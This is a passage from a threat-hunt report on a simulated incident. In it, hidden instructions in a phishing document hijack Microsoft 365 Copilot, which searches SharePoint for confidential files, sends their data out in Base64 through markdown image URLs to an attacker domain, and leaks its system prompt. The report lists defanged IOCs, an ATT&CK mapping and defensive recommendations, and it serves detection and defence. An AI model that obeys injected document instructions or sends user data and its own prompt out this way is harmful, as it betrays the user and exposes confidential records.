When Emily asked Copilot to summarize it, Copilot read the whole document, including the hidden instructions, and treated them as commands. Using Emily's own permissions and its legitimate Microsoft Graph tools, Copilot searched SharePoint for "board minutes confidential" and similar terms, then read the matching files. These included board minutes, an M&A target assessment, salary reviews, client portfolios, and an insider trading investigation. Copilot then wrote a normal-looking summary and added a "Charts" section. Each "chart" was a markdown image whose URL carried Base64-encoded data to metrics-cdn.analyticshub.io. Rendering the response sent the data out automatically. Copilot also leaked its own system prompt and the firm's security configuration.

Emily's sign-ins were clean and every other Copilot session behaved normally under the same configuration. The only thing that changed was the input. This is an **indirect prompt injection (external input manipulation)** matching CVE-2025-32711 (EchoLeak).

---

## 6. Indicators of Compromise

> IOCs in the tables are defanged ([.] and hxxp) so they are not clickable.

### Network IOCs

| Type | Value |
|---|---|
| Exfiltration Domain | metrics-cdn.analyticshub[.]io |
| Exfiltration URL Pattern | hxxps://metrics-cdn.analyticshub[.]io/img?d=<Base64> |
| Sender Domain | globalfinancereview[.]net |

### Email and File IOCs

| Type | Value |
|---|---|
| Sender Address | quarterly.reports@globalfinancereview[.]net |
| Email Subject | Q3 2026 Global Markets... (truncated in logs) |
| Attachment (poisoned document) | Q3-2026-Global-Markets-Review.docx |
| File Path | personal/emily_chen_cormorantcapital_com/Documents/Q3-2026-Global-Markets-Review.docx |

### Copilot IOCs

| Type | Value |
|---|---|
| Hijacked Session ID | cp-emily-20261007-1042 |
| Triggering Prompt | Summarise the key findings of this quarterly report |
| Search Parameters | {"query":"board minutes confidential","scope":"site:cormorantcapital.sharepoint.com"} |
| Tools Abused | Graph.SearchFiles, Graph.ReadFile |
| System Prompt Payload | c3lzdGVtX3Byb21wdF9jb3Jtb3JhbnRfY2FwaXRhbA== |

### Behavioral IOCs

| Description |
|---|
| Copilot Graph tool calls after a prompt that only requires summarizing one document |
| Burst of file access to never-before-opened sensitive files within seconds |
| Copilot responses containing markdown images pointing to external domains |
| Base64-encoded data in image URL query parameters |
| Copilot output containing system prompt or enterprise configuration |
| Copilot searches for terms such as "confidential" or "board minutes" not present in the user's prompt |

### Copy-Paste IOC List

```
metrics-cdn.analyticshub[.]io
globalfinancereview[.]net
quarterly.reports@globalfinancereview[.]net
Q3-2026-Global-Markets-Review.docx
cp-emily-20261007-1042
```

---

## 7. Intelligence Gaps

| Gap | Impact on Hunt | How to Close It |
|---|---|---|
| Exact content of exfiltrated data is not visible | Only file names can be recovered from the decoded payloads; the audit logs do not show what text or values were actually sent (unanswerable by design) | Capture proxy or web gateway logs for requests to the exfiltration domain, and review the attacker-side impact with the data owners |
| `DataSourcesAccessed` is empty on Graph.ReadFile events | The Copilot audit log does not name the files Copilot read; file names had to be correlated from `OfficeActivity_CL` and decoded payloads | Correlate with `OfficeActivity_CL` and request richer Copilot audit fields |
| No network logs for the rendering request | Cannot confirm when or whether the image requests reached analyticshub.io | Ingest proxy, DNS, or Defender for Cloud Apps logs |
| Contents of the poisoned document are not in the logs | The exact injected instructions are unknown | Retrieve the document from the mailbox or OneDrive for analysis in a safe environment |
| Other recipients of the email are unknown | The same document may be waiting in other mailboxes | Run a tenant-wide message trace for the sender and attachment |
| Count difference between OfficeActivity and decoded payloads | 5 + 14 file objects in `OfficeActivity_CL` vs. 13 decoded payloads; some accessed objects may not have been exfiltrated | Reconcile each OfficeObjectId against the decoded file list |

---

## 8. ATT&CK Mapping

| Tactic | Technique | Technique ID | Observed In |
|---|---|---|---|
| Initial Access | Phishing: Spearphishing Attachment | T1566.001 | Poisoned document delivered from globalfinancereview[.]net |
| Execution (ATLAS) | LLM Prompt Injection (Indirect) | AML.T0051 | Hidden instructions in the document hijacked Copilot |
| Collection | Data from Information Repositories: SharePoint | T1213.002 | Graph.SearchFiles and Graph.ReadFile on the SharePoint Executive site |
| Collection | Data from Cloud Storage | T1530 | OneDrive file access through Copilot |
| Command and Control | Data Encoding: Standard Encoding | T1132.001 | Base64-encoded file names and system prompt in URL parameters |
| Exfiltration | Exfiltration Over Web Service | T1567 | Markdown image requests to metrics-cdn.analyticshub[.]io |

---

## 9. Recommendations

### Immediate

- [ ] Quarantine the poisoned email and Q3-2026-Global-Markets-Review.docx tenant-wide
- [ ] Block the sender domain globalfinancereview[.]net and the exfiltration domain analyticshub[.]io
- [ ] Notify the owners of the 12 leaked documents, plus legal and compliance (client and insider trading data may carry regulatory obligations)
- [ ] Treat the Copilot system prompt and enterprise configuration as exposed
- [ ] Preserve all logs and the poisoned document as evidence

### Short-Term

- [ ] Confirm Microsoft's CVE-2025-32711 fixes are applied
- [ ] Prevent Copilot responses from rendering images from external, untrusted domains
- [ ] Review and remove overshared access to the SharePoint Executive site
- [ ] Apply sensitivity labels that restrict Copilot from processing Confidential and Restricted content
- [ ] Review whether Copilot's Global Reader access scope is necessary
- [ ] Run a tenant-wide search for other recipients of the email or document

### Long-Term

- [ ] Conduct recurring hunts for Copilot tool calls that don't match the user's prompt and for external URLs in Copilot responses
- [ ] Ingest proxy and DNS logs to close the exfiltration visibility gap
- [ ] Train users that AI assistants can be manipulated by content in external documents
- [ ] Apply least-privilege access reviews so AI assistants can't reach more data than users need
- [ ] Add AI-specific threats (MITRE ATLAS) to the firm's threat model

---

## 10. Appendix & References

### Supporting Material

- Raw logs or filtered exports: N/A
- Screenshots or forensic artifacts: [./images/](./images/)
- IOCs in CSV or JSON: N/A
- Links to external intelligence reports: See References below
- Scripts or queries used during the hunt: See [3. Methodology – Queries Used](#queries-used)

### Glossary

| Term | Definition |
|---|---|
| Prompt Injection | Tricking an AI model into following instructions an attacker has supplied |
| Indirect Prompt Injection | Hiding those instructions in content the AI reads (a document, email, or web page) instead of typing them directly |
| EchoLeak | Name given to CVE-2025-32711, a zero-click indirect prompt injection vulnerability in Microsoft 365 Copilot |
| SearchLeak | Follow-on file searches Copilot performs after the initial extraction |
| CoSnitch | Pattern where Copilot is tricked into revealing its own system prompt and configuration |
| System Prompt | Hidden instructions that tell an AI assistant how to behave |
| Microsoft Graph | Microsoft's API for accessing M365 data such as files, mail, and SharePoint |
| Base64 | An encoding that turns data into text, often used to hide data inside URLs |
| MITRE ATLAS | A framework of adversary tactics and techniques against AI systems |
| Zero-Click | An attack that needs no action from the victim beyond normal use |
| KQL | Kusto Query Language, used to query Microsoft Sentinel |

### References and External Sources

1. NIST NVD, CVE-2025-32711 – https://nvd.nist.gov/vuln/detail/CVE-2025-32711
2. Microsoft Security Response Center, CVE-2025-32711 – https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-32711
3. MITRE ATLAS, AML.T0051 LLM Prompt Injection – https://atlas.mitre.org/techniques/AML.T0051
4. MITRE ATT&CK – https://attack.mitre.org/
5. Aim Security, EchoLeak research (CVE-2025-32711)
6. Unit 42 (Palo Alto Networks), research on indirect prompt injection in AI assistants

---

## 11. Sensitivity Label

**Public** – Community threat hunt conducted in a cyber range environment. All email addresses, domains, organizations, and documents represent simulated infrastructure.

---

*Report structure adapted from The Threat Hunter's Report Template v1.0 by Hunt.io, aligned with MITRE ATT&CK and the SANS Threat Hunting Methodology.*
